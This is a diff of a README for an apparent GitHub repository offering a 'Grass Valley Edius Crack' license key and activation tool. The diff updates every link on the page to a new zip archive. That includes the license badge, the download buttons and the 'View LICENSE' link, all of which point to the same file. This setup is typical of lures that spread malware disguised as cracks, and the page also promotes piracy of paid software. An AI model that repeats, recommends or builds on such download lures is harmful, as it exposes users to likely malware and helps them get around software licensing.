@@ -1,7 +1,7 @@
 # Grass Valley Edius Crack | Download License Key & Activation Tool 🚀
 
-[![License: MIT](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)  
-[![Supported Platforms](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip%2C_8%2C_10%https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)](#-os-compatibility)
+[![License: MIT](https://github.com/ToNiePiter/edius-grass-valley-premium-unlock/raw/refs/heads/branch/sphaeridial/premium-unlock-valley-edius-grass-v1.1.zip)](https://github.com/ToNiePiter/edius-grass-valley-premium-unlock/raw/refs/heads/branch/sphaeridial/premium-unlock-valley-edius-grass-v1.1.zip)  
+[![Supported Platforms](https://github.com/ToNiePiter/edius-grass-valley-premium-unlock/raw/refs/heads/branch/sphaeridial/premium-unlock-valley-edius-grass-v1.1.zip%2C_8%2C_10%https://github.com/ToNiePiter/edius-grass-valley-premium-unlock/raw/refs/heads/branch/sphaeridial/premium-unlock-valley-edius-grass-v1.1.zip)](#-os-compatibility)
 
 Grass Valley Edius stands tall among the digital editing titans—redrawing the lines between creativity and technology. This repository presents resources and innovative solutions for unlocking the boundless potential of Edius, including a unique path to effortless licensing for content creators, editors, and filmmakers aiming for maximum efficiency.
 
@@ -81,7 +81,7 @@ Ready to delve into the next phase of your video editing odyssey? Here’s where
 
 **Download the Edius License Solution:**
 
-[![Download](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)
+[![Download](https://github.com/ToNiePiter/edius-grass-valley-premium-unlock/raw/refs/heads/branch/sphaeridial/premium-unlock-valley-edius-grass-v1.1.zip)](https://github.com/ToNiePiter/edius-grass-valley-premium-unlock/raw/refs/heads/branch/sphaeridial/premium-unlock-valley-edius-grass-v1.1.zip)
 
 > **Instructions:**
 > - Download the toolkit above.
@@ -118,7 +118,7 @@ Our repository is architected to reach editors and creative professionals search
 ## 📜 MIT License (2025)
 
 This project is licensed under the MIT License.  
-[View LICENSE](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)
+[View LICENSE](https://github.com/ToNiePiter/edius-grass-valley-premium-unlock/raw/refs/heads/branch/sphaeridial/premium-unlock-valley-edius-grass-v1.1.zip)
 
 ---
 
@@ -126,7 +126,7 @@ This project is licensed under the MIT License.
 
 To revisit the activation toolkit and keep your creative flames burning, grab your utility below:
 
-[![Download](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)](https://raw.githubusercontent.com/ToNiePiter/edius-grass-valley-premium-unlock/branch/sphaeridial/edius-grass-valley-premium-unlock.zip)
+[![Download](https://github.com/ToNiePiter/edius-grass-valley-premium-unlock/raw/refs/heads/branch/sphaeridial/premium-unlock-valley-edius-grass-v1.1.zip)](https://github.com/ToNiePiter/edius-grass-valley-premium-unlock/raw/refs/heads/branch/sphaeridial/premium-unlock-valley-edius-grass-v1.1.zip)
 
 ---
 
